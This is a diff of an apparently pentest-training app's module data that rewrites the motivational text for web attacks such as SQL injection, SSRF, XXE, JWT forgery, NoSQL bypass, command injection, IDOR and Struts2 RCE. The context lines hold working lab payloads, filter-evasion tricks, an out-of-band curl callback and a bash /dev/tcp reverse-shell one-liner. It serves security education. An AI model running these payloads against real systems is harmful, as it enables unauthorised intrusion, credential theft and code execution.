@@ -326,7 +326,7 @@
       teach: 'A single quote that throws a SQL error means your input reaches the query unescaped, the first proof of SQL injection. From here you find the column count and start extracting data (or hand it to sqlmap).',
     },
     'manual-sqli-exploitation': {
-      why: "Automated injection tools such as sqlmap are prohibited under OSCP examination conditions, so a confirmed injection must be exploited entirely by hand, and this is the module that drills it. The sequence is fixed: find the column count, locate the reflected columns with a UNION SELECT, fingerprint the database and the account it runs as, then extract data one table at a time. Where nothing is reflected, recover the data through an inference oracle, one character per request. Where the database account holds the FILE privilege, the same injection reads local files and writes a web shell to the web root, turning data theft into code execution. Practise it until it is second nature, because on the exam it is the only SQL injection path open to you.",
+      why: "This is the single most examinable SQL skill, precisely because the exam bans the tool that would otherwise do it for you. Students who only ever run sqlmap freeze the moment it is taken away, so the whole point of this module is fluency under that constraint: taking a database apart by hand fast enough that it is not what costs you the box. Reach for it the instant you have a confirmed injection, and drill the blind path hardest, since it is the slowest to improvise and the easiest to fumble when the clock is running.",
       cmd: "curl -s 'http://10.10.10.10/page.php?id=0 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -'", tool: 'curl',
       output: [
         '<h2>Search results</h2>',
@@ -377,7 +377,7 @@
       teach: 'An exposed .svn/ directory leaks the source tree the way .git/ does. The entries file lists real filenames, db_connect.php likely holds database credentials. Reconstruct the files and read them.',
     },
     'ssrf': {
-      why: "Any feature that fetches a URL for you (link previews, webhooks, \"import from URL\", image loaders, PDF generators) can be turned into a request from the server's point of view, which reaches what you cannot: internal services, admin panels bound to localhost, cloud metadata. Reach for it whenever the app takes a URL. The classic lab win is reading 169.254.169.254 for cloud credentials; the general win is using the server as your proxy into the network behind it.",
+      why: "SSRF is the bug that converts \"outside the network\" into \"inside it\", which is why it earns a probe on any input that even smells like a URL, however dull the feature looks. Its payoff scales with the environment: a flat lab box gives you an internal-only admin panel, while a cloud target can hand over credentials from the metadata service and, with them, the account. Reach for it early, because what it opens up (internal services, hosts you could not otherwise touch) usually dwarfs whatever you were originally poking at.",
       cmd: "curl -s 'http://10.10.10.10/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin'", tool: 'curl',
       output: [
         '{',
@@ -399,7 +399,7 @@
       teach: 'You sent {{7*7}} and the page returned 49, the template engine evaluated your input instead of printing it. Server-Side Template Injection often escalates straight to remote code execution; identify the engine, then build the RCE payload.',
     },
     'xxe': {
-      why: "Anywhere an app parses XML (file uploads, SOAP or REST APIs, SAML, even .docx and .xlsx), the parser may resolve external entities you define, which becomes file reads, SSRF, and occasionally RCE. Find the XML parsers by sending XML or flipping the Content-Type to application/xml and watching for a change in behaviour. Reach for it on any XML-accepting endpoint. The reliable prize is reading local files; the richer one is pivoting the parser into SSRF.",
+      why: "XXE is easy to walk past because XML hides inside things that do not look like XML: a SAML login, a .docx upload, an API that quietly accepts application/xml. That invisibility is exactly why you test for it on purpose instead of hoping to stumble over it. Treat a dependable file read as the baseline win and pivoting the parser into SSRF as the upgrade; only chase RCE on the rare parser that permits it, since the file read alone is usually enough to find your next step.",
       cmd: 'curl -s -X POST http://10.10.10.10/api -H "Content-Type: application/xml" --data-binary @xxe.xml', tool: 'curl',
       output: [
         '<result>',
@@ -424,7 +424,7 @@
       ],
     },
     'jwt-attacks': {
-      why: "A JSON Web Token is only as strong as its signing secret and the server's verification code, and apps get both wrong constantly. Work the ladder: decode and read the claims, try alg:none, crack a weak HMAC secret offline, and if you hold the source, abuse key confusion. Reach for it whenever auth rides in a JWT. The quick wins, a none-alg token or a guessable secret, are worth a two-minute check on every token you see.",
+      why: "Wherever authentication rides in a JWT, the two cheapest checks in web pentesting live here: an alg:none token and a guessable HMAC secret each take under a minute and either one mints any account you want. That asymmetry, seconds of effort against a full auth bypass, is why you run them on every token you meet before reaching for anything slower. The heavier wins, key confusion or a secret lifted from leaked source, are for later, once the free checks are spent.",
       cmd: "echo $TOKEN | cut -d. -f2 | base64 -d", tool: 'sh',
       output: [
         '{"user":"guest","role":"user","iat":1700000000}',
@@ -433,7 +433,7 @@
       teach: 'Decode the token first, the middle segment is the claims. If the server accepts alg:none, or the HMAC secret is weak enough to crack (hashcat -m 16500), you re-sign a token that says role:admin. The claims tell you exactly what to tamper with.',
     },
     'nosql-injection': {
-      why: "MongoDB-backed logins often accept operator objects where they expect strings, so user[$ne]=x&pass[$ne]=x means \"not equal to x\", which is always true, and you log in as the first user (usually admin) with no password at all. Reach for it the moment a login talks to a NoSQL backend, or JSON is accepted where a plain string belongs. It is one of the fastest auth bypasses there is, so test it before you try to brute-force anything.",
+      why: "This is one of the fastest auth bypasses there is, so it belongs at the very top of your list the moment a login talks to MongoDB or takes JSON where a string belongs. Test it before you even consider brute-forcing, because a single operator object can log you in as admin with nothing to guess. The habit worth building is spotting the backend quickly, since the whole attack only applies where the datastore is NoSQL.",
       cmd: "curl -s -i -X POST http://10.10.10.10/login -d 'user[$ne]=x&pass[$ne]=x'", tool: 'curl',
       output: [
         'HTTP/1.1 302 Found',
@@ -491,7 +491,7 @@
     },
     'command-injection': {
       how: {"lead":"Confirm execution safely first, then escalate to a real shell. The order matters, understand the context before you fire a payload:","items":[{"t":"Pick a separator that fits the context","d":"Chain with ; (run both), && (run if the first succeeds), | (pipe into your command), or a newline. If your input lands inside quotes, break out first: '; id or \"; id. Try a few, one usually survives the app's parsing."},{"t":"Confirm blind execution out-of-band","d":"When nothing comes back in the response, prove it another way: ; ping -c1 <you> while watching tcpdump, or ; curl http://<you>/$(whoami) and read your web log. A callback confirms RCE even when the page stays silent."},{"t":"Enumerate before you shell","d":"Run id, hostname, and uname -a (or whoami on Windows) first, so you know who you are and what the box is before committing to a reverse shell that may behave differently than you expect."},{"t":"Beat shallow input filters","d":"If spaces are blocked, use ${IFS} or <>; if a keyword is filtered, split it (w''hoami) or smuggle it base64-encoded: echo d2hvYW1p | base64 -d | sh. Command-injection filters are usually thin and easy to slip past."},{"t":"Go for the reverse shell","d":"Once confirmed, inject a one-liner with a listener already waiting: bash -i >& /dev/tcp/<you>/<port> 0>&1, or a Python or nc fallback when bash is missing. URL-encode the payload so it survives the HTTP request intact."}]},
-      why: "When a parameter flows into a system command (ping tools, DNS lookups, file converters, PDF makers), you can append your own command and the server runs it, which is direct RCE. Confirm with a harmless probe first (;id), then enumerate, then go for a shell, in that order, so you understand the context before you commit to a payload. Reach for it on any feature that smells like it shells out; it is one of the most reliable RCE classes on lab boxes.",
+      why: "Command injection is the most direct road to RCE there is: no memory corruption, no exploit to port, just the server running whatever you append. That reliability is why any feature that plausibly shells out (a ping tool, a converter, a report generator) earns a quick probe ahead of slower avenues. The discipline that separates a clean win from a wrecked box is confirming the context with a harmless probe first, above all for the blind variants where nothing comes back, so you are not firing a shell payload into a sink you do not understand.",
       cmd: "curl -s 'http://10.10.10.10/ping.php?ip=127.0.0.1;id'", tool: 'curl',
       output: [
         'PING 127.0.0.1 (127.0.0.1): 56 data bytes',
@@ -502,7 +502,7 @@
       teach: 'The app ran your ;id alongside its ping, the uid=www-data line is the web server executing your command. That is command injection, and it is a direct path to a reverse shell as the web user.',
     },
     'idor': {
-      why: "Every request that names an object by id (?uid=5, /api/users/123) asks a question the server often forgets to answer: is it checking WHO is asking, or only WHAT they asked for. Make two accounts, then try to read account A's data while logged in as B; if it works, that is IDOR. Reach for it on anything that references objects by a guessable id. It needs no exploit code, just changing a number, which is exactly why it is worth checking everywhere.",
+      why: "IDOR is the best reward-to-effort bug on the web: no payload, no tooling, just changing a number while logged in as someone else, and it routinely exposes other users' data or whole admin functions. That is why it is worth checking on every object reference instead of saving for later. Carry the mindset that access control is a question the server must answer on every request, and the place it is most often forgotten is the second, third, and hundredth object, which is how one IDOR enumerates into a breach.",
       cmd: "curl -s 'http://10.10.10.10/account?id=1002' -H 'Cookie: session=<yours>'", tool: 'curl',
       output: [
         '{"id":1002,"name":"Alice Renner","email":"alice@acme.internal",',
@@ -552,7 +552,7 @@
       ],
     },
     'check-struts2': {
-      why: "Apache Struts2 evaluates an OGNL expression hidden in the Content-Type header, so one crafted request runs a command and returns its output: pre-auth RCE from a single curl. Unlike Log4Shell this one is in-band, the command output comes straight back, so you confirm it immediately. Reach for it when you fingerprint Struts2 (CVE-2017-5638); it is a fast, high-impact check to run before you invest time in anything slower.",
+      why: "This is a run-it-first check: once a target fingerprints as Struts2, one request either returns command output or it does not, so it costs seconds and either wins the box outright or is ruled out. Prioritise it over slower, noisier attacks the instant the stack matches, because pre-auth RCE from a single curl is as good as web exploitation gets. Its in-band nature is the gift, you are never left guessing whether it worked, which makes it a confidence-building opening play rather than a time sink.",
       cmd: 'curl -sSk http://10.10.10.10/ -H "Content-Type: %{(#cmd=\'id\')...OGNL...}"', tool: 'curl',
       output: [
         'uid=0(root) gid=0(root) groups=0(root)',
